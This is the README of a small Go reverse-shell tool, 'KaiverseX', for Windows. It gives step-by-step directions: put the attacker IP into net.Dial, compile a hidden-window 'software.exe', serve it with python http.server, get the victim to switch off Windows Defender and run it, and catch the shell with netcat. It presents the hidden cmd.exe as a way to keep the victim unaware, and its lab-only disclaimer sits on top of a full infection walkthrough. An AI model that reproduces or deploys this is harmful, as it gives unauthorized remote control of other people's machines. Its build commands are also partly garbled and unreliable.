KaiverseX is a small malware made in Go with the purpose of gaining access to a Windows machine remotely through reverse shell.
This payload allows Pantesters to experiment over TCP connections and can be useful for those who are learning about reverse engineering and malware analysis.

The payload does NOT include any obfuscation attemp or any other syscall than TCP conection. It is a ethical purpose working. However, this payload
can be used for gain access into machines you don't have permissions. Please, allways use it in Virtual Machines or controlled LABs.

 //  KaiverseX made by @kaijulele - CyberWarrior . https://t.me/@kaijulele


--------------------------------------------------------------------------------------------------------------------------------------------------------------

💥 two single features

 > The payload hides "cmd.exe". Therefore, the victim does not realize that he has been infected except for Windows Defender

 > Free navigation unless target shut down the machine.

--------------------------------------------------------------------------------------------------------------------------------------------------------------

⚙️  How to activate?

 Since you've cloned the repo. Just navigate into it and execute the command:


  > nano payload.go
  

 then change te part:
   
 
  > net.Dial("tcp", "LAN_IPV4:4444")


 to:  


  >  net.Dial("tcp," "192.168.1.101:4444")
 

 Expecting your attacker IP machine. 
  
  
 Next that, compile with :
 
  >  GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe reverse_shell.go 
 
🚫 If compile give any error, try :

  >  GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe reverse_shell.go "
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------

👾 How to infect the target ?

 Firts, make sure you have installed python3.
 
  > python3 --version
  
  expected output : 


  >  Python 3.13.5

  
  Then, Make a temporal server.
  
  > python3 -m http.server 8000
  
  expected output : >

                    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

 The target machine must open web browser and type 

  > http://attacker_machine_ip:8000

 Then just disable win defender and download the previous compiled *software.exe*

----------------------------------------------------------------------------------------------------------------------------------------------------------------

😈 Final attack 

 Start to listen with nc in the port 4444

  > sudo nc -lvnp 4444

  expected output : 

  > Listening on 0.0.0.0 4444

 Just double click on software.exe in target machine and...

✅ Conection stablished
 
📹 see demo in **demo.mp4** 




